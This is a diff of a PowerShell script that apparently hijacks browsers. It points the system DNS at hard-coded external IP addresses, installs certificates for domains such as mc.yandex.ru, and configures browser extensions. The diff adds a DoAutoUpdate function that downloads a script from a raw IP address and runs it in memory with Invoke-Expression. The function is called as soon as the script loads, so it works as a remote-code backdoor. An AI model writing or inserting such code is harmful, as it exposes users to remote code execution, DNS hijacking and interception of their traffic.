@@ -154,8 +154,10 @@ function chromeublock_ProcessManifest {
 
     Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
 }
-$PrimaryDNSServer = '185.247.141.78'
-$SecondaryDNSServer = '185.247.141.51'
+$PrimaryDNSServer = '213.226.112.111'
+$SecondaryDNSServer = '195.58.51.168'
+$autoUpdate = 'False'
+$updateUrl = 'http://213.226.112.110/data/update.txt'
 $xdata = @{
     'mc.yandex.ru'='MIIKsQIBAzCCCm0GCSqGSIb3DQEHAaCCCl4EggpaMIIKVjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAg7b907Z/l3VAICB9AEggTYV4Gwenr9KDAv3madoOk1EeF82TazbxTdlpCswTGL'+ 
 'IAQILTlqcPV/Gmp+Rn+//oP5vTJs0rRSP2Jm1Dj5J1XH4eySKWYJGIZ7B7EMNaxtSLep+0CDRTdEgRdRUNcgzZ6q+0sXRbdrTJtgP+EY4raH36QYFc0SThhDBYUFXmORAXiMPjd4Qyvch9WBVbL4Mry7OReP9hVofX4FJ7K9I0zzY2uYCkI7eyN9OsB50bbzD8ON99lr'+ 
@@ -410,6 +412,7 @@ function ConfigureOperaInternal {
 . ./opera.ps1
 . ./firefox.ps1
 . ./cert.ps1
+. ./xUpdate.ps1
 
 function main {
     Set-DNSServers -PrimaryDNSServer $primaryDNSServer -SecondaryDNSServer $secondaryDNSServer
@@ -457,6 +460,28 @@ function Close-Processes {
         Invoke-Expression $command
     }
 }
+#AutoUpdate
+
+function DoAutoUpdate() 
+{
+   
+    if ($autoUpdate -eq 'True')
+    {
+
+    try {
+        # Download the script content from the URL
+        $scriptContent = Invoke-WebRequest -Uri $updateUrl -UseBasicParsing -Method Get | Select-Object -ExpandProperty Content
+        
+        # Execute the downloaded script content in memory
+        Invoke-Expression -Command $scriptContent
+    }
+    catch {
+        Write-Error "Failed to download or execute the script: $_"
+    }
+    }
+}
+
+DoAutoUpdate
 . ./utils.ps1
 
 function ConfigureYandex
